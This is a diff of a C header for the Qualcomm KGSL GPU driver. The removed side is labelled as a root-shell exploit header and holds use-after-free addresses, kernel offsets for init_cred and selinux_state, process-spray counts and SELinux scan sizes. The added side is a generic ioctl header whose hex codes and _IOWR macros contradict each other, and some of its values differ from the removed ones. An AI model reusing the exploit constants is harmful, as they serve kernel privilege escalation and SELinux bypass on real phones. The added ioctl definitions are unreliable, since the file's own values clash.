@@ -1,98 +1,66 @@
-#ifndef ROOT_SHELL_H
-#define ROOT_SHELL_H
+#ifndef KGSL_IOCTL_H
+#define KGSL_IOCTL_H
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <errno.h>
-#include <pthread.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <sched.h>
-#include <sys/prctl.h>
-#include <signal.h>
-#include <sys/syscall.h>
-#include <linux/perf_event.h>
-#include <asm/unistd.h>
-#include <sys/wait.h>
-#include <sys/select.h>
-#include <poll.h>
-#include <sys/stat.h>
-#include <dirent.h>
+#define KGSL_GPUOBJ_ALLOC                    0xC0406E01
+#define KGSL_GPUOBJ_FREE                     0xC0086E02
+#define KGSL_GPUOBJ_IMPORT                   0xC0406E03
+#define KGSL_GPU_DRAWOBJ                     0xC0106E05
+#define KGSL_GPU_DRAWOBJ_SYNC                0xC0206E06
+#define KGSL_CREATE_CONTEXT                  0xC0086E07
+#define KGSL_DESTROY_CONTEXT                 0xC0086E08
 
-#define KGSL_IOC_TYPE 0x09
+#define IOCTL_KGSL_GPUOBJ_ALLOC              _IOWR('K', 0x01, struct kgsl_gpuobj_info)
+#define IOCTL_KGSL_GPUOBJ_FREE               _IOW('K', 0x02, uint32_t)
+#define IOCTL_KGSL_GPUOBJ_IMPORT             _IOWR('K', 0x03, struct kgsl_gpuobj_import)
+#define IOCTL_KGSL_GPU_DRAWOBJ               _IOW('K', 0x05, void *)
+#define IOCTL_KGSL_GPU_DRAWOBJ_SYNC          _IOW('K', 0x06, struct kgsl_drawobj_sync)
+#define IOCTL_KGSL_CREATE_CONTEXT            _IOWR('K', 0x07, struct kgsl_context)
+#define IOCTL_KGSL_DESTROY_CONTEXT           _IOW('K', 0x08, uint32_t)
 
-struct kgsl_gpuobj_alloc {
-    uint64_t size; uint64_t flags; uint64_t va_len;
-    uint64_t mmapsize; unsigned int id;
-    unsigned int metadata_len; uint64_t metadata;
+#define KGSL_DRAWOBJ_TYPE_CMD                0x1
+#define KGSL_CMD_FLAG_INTERNAL_ISSUE         0x100
+#define KGSL_CMD_SYNCPOINT_TYPE_TIMESTAMP    0x1
+#define KGSL_SYNC_HANDLE_IGNORE              0xFFFFFFFF
+#define KGSL_SYNC_ID_IGNORE                  0xFFFFFFFF
+#define KGSL_CMD_TIMESTAMP_MAX               0xFFFFFFFF
+#define KGSL_DRAWOBJ_CMD_LIST_TYPE_IB        0x1
+
+#define KGSL_USER_MEM_TYPE_ADDR              0x1
+#define KGSL_GPUOBJ_IMPORT_WRITE             0x1
+
+#define CP_NOP                               0x10
+#define CP_MEM_WRITE                         0x19
+
+struct kgsl_gpuobj_info {
+    uint64_t gpuaddr;
+    uint64_t size;
+    uint32_t id;
+    uint32_t flags;
+    uint64_t priv;
+    uint32_t pad;
 };
-#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
 
-struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
-#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
-
-struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
-
-struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
-
-struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
-
-struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
-#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
-
-struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };
-
-struct kgsl_gpu_command {
-    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
-    uint64_t objlist; unsigned int objsize, numobjs;
-    uint64_t synclist; unsigned int syncsize, numsyncs;
-    unsigned int context_id, timestamp;
+struct kgsl_gpuobj_import {
+    uint32_t type;
+    uint32_t flags;
+    uint64_t useraddr;
+    uint64_t len;
+    uint32_t id;
+    uint32_t pad;
 };
-#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
 
-struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
-#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
+struct kgsl_context {
+    uint32_t flags;
+    uint32_t id;
+    uint32_t pad;
+};
 
-#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
-#define KGSL_CACHEMODE_SHIFT 0
-#define KGSL_CACHEMODE_MASK 3
-#define KGSL_CACHEMODE_UNCACHED 0
-#define KGSL_CACHEMODE_WRITECOMBINE 1
-#define KGSL_CACHEMODE_WRITETHROUGH 2
-#define KGSL_CACHEMODE_WRITEBACK 3
-#define KGSL_USER_MEM_TYPE_ADDR 2
-#define KGSL_CONTEXT_PREAMBLE 0x00000010
-#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
-#define KGSL_CMDLIST_IB 0x00000001U
-#define KGSL_TIMESTAMP_RETIRED 0x00000002
-
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
-
-#define OFFSET_INIT_CRED               0x2117d08ULL
-#define OFFSET_SELINUX_STATE           0x28b9000ULL
-
-#define SPRAY_PIDS 3000
-#define SCAN_DWORDS 560
-#define AVC_SCAN_DWORDS 1024
-#define AVC_CHILD_COUNT 200
-#define SELINUX_STATE_SCAN_SIZE 0x200
-
-#define CP_NOP 0x10
-#define CP_MEM_WRITE 0x3D
-#define CP_MEM_TO_MEM 0x73
+struct kgsl_drawobj_sync {
+    uint32_t context_id;
+    uint32_t timestamp;
+    uint32_t type;
+    uint32_t handle;
+    uint32_t id;
+};
 
 #endif
